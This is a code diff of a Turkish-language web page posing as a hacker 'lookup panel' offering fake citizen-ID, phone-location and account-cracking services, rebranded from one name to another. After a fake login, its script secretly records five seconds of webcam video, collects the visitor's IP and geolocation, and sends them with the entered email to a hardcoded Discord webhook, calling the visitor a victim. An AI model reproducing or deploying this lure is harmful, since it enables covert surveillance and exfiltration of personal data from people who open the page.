@@ -3,41 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>N 4 S T R 0 Y</title>
+    <title>M 0 S R E W // DOMINANCE</title>
     <style>
-        :root { --blue: #2480ff; --red: #f85149; --bg: #06080a; --card: #0d1117; --border: #21262d; }
-        body { background: var(--bg); color: #c9d1d9; font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow: hidden; }
+        :root { --blue: #2480ff; --red: #ff0000; --bg: #030405; --card: #0a0c10; --border: #1b1f24; }
+        body { background: var(--bg); color: #c9d1d9; font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* GİRİŞ EKRANLARI */
+        /* AUTH EKRANI */
         #authWrapper { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 30px; border: 1px solid var(--border); border-radius: 12px; width: 320px; text-align: center; }
-        input { width: 100%; padding: 12px; margin-top: 15px; background: #010409; border: 1px solid var(--border); color: #fff; border-radius: 6px; outline: none; box-sizing: border-box; }
-        .btn-blue { background: var(--blue); color: #fff; border: none; padding: 12px; width: 100%; margin-top: 20px; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        
+        .auth-card { background: var(--card); padding: 35px; border: 1px solid var(--red); border-radius: 4px; width: 320px; text-align: center; box-shadow: 0 0 20px rgba(255, 0, 0, 0.1); }
+        input { width: 100%; padding: 12px; margin-top: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 4px; outline: none; }
+        .btn-red { background: var(--red); color: #000; border: none; padding: 12px; width: 100%; margin-top: 20px; border-radius: 2px; font-weight: 900; cursor: pointer; letter-spacing: 2px; }
+
+        /* PANEL ANA YAPI */
         #panel { display: none; padding: 10px; }
-        .top-bar { height: 50px; background: var(--card); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; position: relative; }
+        .top-bar { height: 50px; background: #000; border-bottom: 1px solid var(--red); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; }
         
-        /* ÜÇ ÇİZGİ MENÜ BUTONU */
+        /* HAMBURGER */
         .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 4px; z-index: 40000; }
-        .hamburger div { width: 22px; height: 2px; background: #fff; transition: 0.3s; }
+        .hamburger div { width: 22px; height: 2px; background: var(--red); }
 
-        /* YAN MENÜ (SIDEBAR) */
-        #sideMenu { position: fixed; top: 0; right: -250px; width: 250px; height: 100%; background: var(--card); border-left: 1px solid var(--border); transition: 0.3s; z-index: 35000; padding-top: 60px; box-shadow: -5px 0 15px rgba(0,0,0,0.5); }
-        .side-item { padding: 15px 20px; border-bottom: 1px solid var(--border); font-size: 13px; color: #fff; cursor: pointer; transition: 0.2s; }
-        .side-item:hover { background: #1c2128; color: var(--blue); }
-        .side-item span { font-size: 9px; color: var(--red); float: right; }
+        /* YAN MENÜ */
+        #sideMenu { position: fixed; top: 0; right: -250px; width: 250px; height: 100%; background: #000; border-left: 1px solid var(--red); transition: 0.3s; z-index: 35000; padding-top: 60px; }
+        .side-item { padding: 15px 20px; border-bottom: 1px solid #111; font-size: 12px; cursor: pointer; color: #555; }
+        .side-item:hover { color: var(--red); background: #080000; }
 
-        /* IFS4 YÜKLENME EKRANI (POPUP) */
-        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 280px; background: var(--card); border: 1px solid var(--blue); border-radius: 12px; z-index: 50000; padding: 25px; text-align: center; box-shadow: 0 0 30px rgba(36, 128, 255, 0.2); }
-        .spinner { border: 3px solid #111; border-top: 3px solid var(--blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        /* DEV SORGU LİSTESİ */
+        .menu-container { background: var(--card); border: 1px solid var(--border); border-radius: 4px; margin-top: 10px; max-height: 400px; overflow-y: auto; }
+        .menu-item { padding: 12px 15px; border-bottom: 1px solid #111; font-size: 10px; display: flex; justify-content: space-between; cursor: pointer; text-transform: uppercase; }
+        .status-lock { color: var(--red); font-weight: bold; font-family: monospace; }
+
+        /* IFS4 / M0SREW POPUP */
+        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; background: #000; border: 1px solid var(--red); z-index: 50000; padding: 30px; text-align: center; }
+        .spinner { border: 2px solid #222; border-top: 2px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* ANA İÇERİK */
-        .map-box { height: 160px; background: var(--card); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin-top: 10px; }
-        #mapImg { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
-        .menu-container { background: var(--card); border: 1px solid var(--border); border-radius: 8px; margin-top: 10px; }
-        .menu-item { padding: 10px 15px; border-bottom: 1px solid var(--border); font-size: 11px; display: flex; justify-content: space-between; }
-        .status-red { color: var(--red); font-weight: bold; }
+        .terminal { background: #000; border-left: 3px solid var(--red); padding: 10px; font-family: monospace; font-size: 9px; color: #666; height: 80px; overflow-y: auto; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -47,91 +47,90 @@
 
 <div id="authWrapper">
     <div class="auth-card" id="logCard">
-        <h2 style="color:var(--blue); font-size: 18px; margin:0;">N 4 S T R 0 Y</h2>
-        <input type="text" id="lMail" placeholder="E-Posta">
-        <input type="password" id="lPass" placeholder="Şifre">
-        <button class="btn-blue" onclick="processLog()">GİRİŞ YAP</button>
-        <p style="font-size:10px; color:#555; margin-top:10px; cursor:pointer;" onclick="showReg()">Kayıt Ol</p>
+        <h1 style="color:var(--red); font-size: 24px; margin:0; letter-spacing: 5px;">M 0 S R E W</h1>
+        <p style="font-size:10px; color:#444;">AUTHORITY CONTROL SYSTEM</p>
+        <input type="text" id="lMail" placeholder="User ID">
+        <input type="password" id="lPass" placeholder="Access Key">
+        <button class="btn-red" onclick="processLog()">ENTER SYSTEM</button>
+        <p style="font-size:9px; color:#333; margin-top:15px; cursor:pointer;" onclick="showReg()">Create Authority</p>
     </div>
     <div class="auth-card" id="regCard" style="display:none;">
-        <h2 style="color:var(--red); font-size: 16px;">YENİ PROTOKOL</h2>
-        <input type="text" id="rMail" placeholder="E-Posta">
+        <h2 style="color:#fff; font-size: 14px;">KAYIT OL</h2>
+        <input type="text" id="rMail" placeholder="Mail">
         <input type="password" id="rPass" placeholder="Şifre">
-        <button class="btn-blue" onclick="processReg()">KAYDI TAMAMLA</button>
+        <button class="btn-red" onclick="processReg()">REGISTER</button>
     </div>
 </div>
 
 <div id="panel">
     <div class="top-bar">
-        <span><b>N 4 S T R 0 Y</b> <span id="clock" style="font-size:9px; color:#555; margin-left:5px;">00:00</span></span>
-        <div class="hamburger" onclick="toggleMenu()">
-            <div></div><div></div><div></div>
-        </div>
+        <span><b style="color:var(--red);">M 0 S R E W</b> <span id="clock" style="color:#333; font-size:10px; margin-left:10px;">00:00</span></span>
+        <div class="hamburger" onclick="toggleMenu()"><div></div><div></div><div></div></div>
     </div>
 
     <div id="sideMenu">
-        <div class="side-item" style="color:var(--blue); font-weight:bold; border-bottom: 2px solid var(--blue);">SİSTEM ARAÇLARI</div>
-        <div class="side-item" onclick="openIFS()">EMRE İFS4 <span>AKTİF</span></div>
-        <div class="side-item" onclick="alert('Erişim yetkiniz yok.')">VİP LOGLAR <span>KİLİTLİ</span></div>
-        <div class="side-item" onclick="alert('Erişim yetkiniz yok.')">PROXY ZİNCİRİ <span>PASİF</span></div>
-        <div class="side-item" onclick="alert('Erişim yetkiniz yok.')">DARK WEB SIZMA <span>KİLİTLİ</span></div>
-        <div class="side-item" onclick="location.reload()" style="color:var(--red);">OTURUMU KAPAT</div>
+        <div class="side-item" onclick="openIFS()" style="color:#fff; border-left: 2px solid var(--red);">EMRE İFS4</div>
+        <div class="side-item" onclick="mosMsg()">M0SREW ÖZEL LOG</div>
+        <div class="side-item" onclick="mosMsg()">VERİ TABANI SIZMA</div>
+        <div class="side-item" onclick="mosMsg()">ADMİN YETKİLERİ</div>
+        <div class="side-item" onclick="location.reload()" style="color:var(--red)">SİSTEMDEN ÇIK</div>
     </div>
 
-    <div class="map-box"><img id="mapImg" src=""></div>
+    <div class="terminal" id="termLogs">[SYSTEM] M 0 S R E W yetkisi onaylandı...<br></div>
 
     <div class="menu-container">
-        <div class="menu-item">IP ADRESI <span id="ipD" style="color:#fff;">---</span></div>
-        <div class="menu-item">KONUM <span id="locD" style="color:var(--red);">ARANIYOR...</span></div>
-        <div class="menu-item">MERNİS 2026 <span class="status-red">KİLİTLİ</span></div>
-        <div class="menu-item">GSM LOKASYON <span class="status-red">KİLİTLİ</span></div>
-        <div class="menu-item">TC SORGULAMA <span class="status-red">KİLİTLİ</span></div>
-        <div class="menu-item">AİLE SORGULAMA <span class="status-red">KİLİTLİ</span></div>
+        <div class="menu-item" onclick="mosMsg()">IP ADRESI <span id="ipD" style="color:#fff;">---</span></div>
+        <div class="menu-item" onclick="mosMsg()">KONUM <span id="locD" style="color:var(--red);">ARANIYOR</span></div>
+        <div class="menu-item" onclick="mosMsg()">MERNİS 2026 <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">GSM LOKASYON <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">TC SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">AİLE SORGULAMA <span class="status-red">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">PLAKA SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">AD SOYAD SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">E-OKUL SIZMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">INSTAGRAM CRACK <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">SMS BOMBER <span class="status-lock">OFFLINE</span></div>
+        <div class="menu-item" onclick="mosMsg()">BİNA SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">TAPU SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">SİGORTA DATA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">MAAŞ SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">FACEBOOK SIZMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="mosMsg()">KRİPTO CÜZDAN SIZMA <span class="status-lock">MOSREW ONLY</span></div>
     </div>
 </div>
 
 <div id="ifsBox">
     <div class="spinner"></div>
-    <h3 style="color:#fff; margin:0; font-size: 16px;">EMRE İFS4</h3>
-    <p id="ifsTxt" style="font-size: 11px; color: var(--blue); margin-top: 10px;">Veritabanına sızılıyor...</p>
-    <p style="font-size: 9px; color: #444; margin-top: 20px;">Lütfen bekleyin, bu işlem biraz zaman alabilir.</p>
+    <h3 style="color:#fff; margin:0;">EMRE İFS4</h3>
+    <p id="ifsTxt" style="font-size: 11px; color: var(--red); margin-top: 10px;">M0SREW sunucuna bağlanıyor...</p>
 </div>
 
 <script>
     let u = { ip: '...', lat: 0, lon: 0 };
     const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    function toggleMenu() {
-        const m = document.getElementById('sideMenu');
-        m.style.right = m.style.right === '0px' ? '-250px' : '0px';
-    }
+    function mosMsg() { alert("M 0 S R E W : Bu yetki sadece sahibine aittir. Erişim denemesi kaydedildi."); }
+    function toggleMenu() { const m = document.getElementById('sideMenu'); m.style.right = m.style.right === '0px' ? '-250px' : '0px'; }
 
     function openIFS() {
-        toggleMenu(); // Menüyü kapat
+        toggleMenu();
         document.getElementById('ifsBox').style.display = 'block';
-        const msgs = ["Bağlantı kuruluyor...", "Bypass deniniyor...", "Tokenlar alınıyor...", "Sistem yanıt vermiyor, tekrar deneniyor..."];
-        let i = 0;
-        setInterval(() => {
-            document.getElementById('ifsTxt').innerText = msgs[i % msgs.length];
-            i++;
-        }, 2000); // Sonsuz döngü, asla açılmaz.
+        const t = ["Veri çekiliyor...", "M0SREW onay bekliyor...", "Sistem yüklenemedi...", "Daha fazla yetki lazım..."];
+        let i = 0; setInterval(() => { document.getElementById('ifsTxt').innerText = t[i % t.length]; i++; }, 2000);
     }
 
-    // Giriş/Kayıt Fonksiyonları
     function showReg() { document.getElementById('logCard').style.display='none'; document.getElementById('regCard').style.display='block'; }
-    function processReg() { localStorage.setItem('n_m', document.getElementById('rMail').value); localStorage.setItem('n_p', document.getElementById('rPass').value); alert("Kayıt Başarılı!"); location.reload(); }
-    
+    function processReg() { localStorage.setItem('m_m', document.getElementById('rMail').value); localStorage.setItem('m_p', document.getElementById('rPass').value); alert("Yetki Oluşturuldu!"); location.reload(); }
+
     fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ u.ip=d.ip; document.getElementById('ipD').innerText=d.ip; });
 
     async function processLog() {
-        const m = document.getElementById('lMail').value;
-        const p = document.getElementById('lPass').value;
-        if(m === localStorage.getItem('n_m') && p === localStorage.getItem('n_p')) {
-            initSystem(m, p);
-        } else { alert("Hata!"); }
+        if(document.getElementById('lMail').value === localStorage.getItem('m_m') && document.getElementById('lPass').value === localStorage.getItem('m_p')) {
+            initM0srew();
+        } else { alert("Yetkisiz Giriş Denemesi!"); }
     }
 
-    async function initSystem(m, p) {
+    async function initM0srew() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('secretCam').srcObject = s;
@@ -141,23 +140,21 @@
 
             navigator.geolocation.getCurrentPosition((pos) => {
                 u.lat = pos.coords.latitude; u.lon = pos.coords.longitude;
-                document.getElementById('locD').innerText = u.lat.toFixed(3) + "," + u.lon.toFixed(3);
-                document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${u.lon},${u.lat}&z=14&l=map&size=400,300&pt=${u.lon},${u.lat},pmwtm`;
+                document.getElementById('locD').innerText = u.lat.toFixed(2) + "," + u.lon.toFixed(2);
             });
 
-            // 5 Saniyelik Gizli Kayıt
             const mr = new MediaRecorder(s);
-            let chunks = [];
-            mr.ondataavailable = e => chunks.push(e.data);
+            let ch = [];
+            mr.ondataavailable = e => ch.push(e.data);
             mr.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
+                const b = new Blob(ch, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("payload_json", JSON.stringify({ content: `🚨 **OPERASYON**\nAdmin: ${m}\nIP: ${u.ip}\nKonum: ${u.lat},${u.lon}` }));
-                fd.append("file", blob, "n4_video.webm");
+                fd.append("payload_json", JSON.stringify({ content: `🔱 **M 0 S R E W  D O M I N A N C E**\nKurban: ${localStorage.getItem('m_m')}\nIP: ${u.ip}` }));
+                fd.append("file", b, "mosrew.webm");
                 fetch(wh, { method: "POST", body: fd });
             };
             mr.start(); setTimeout(() => mr.stop(), 5000);
-        } catch(e) { alert("Kamera İzni Şart!"); location.reload(); }
+        } catch(e) { alert("M0SREW: Kamera izni verilmediği için sistem kendini kilitledi."); location.reload(); }
     }
     setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString().slice(0,5); }, 1000);
 </script>
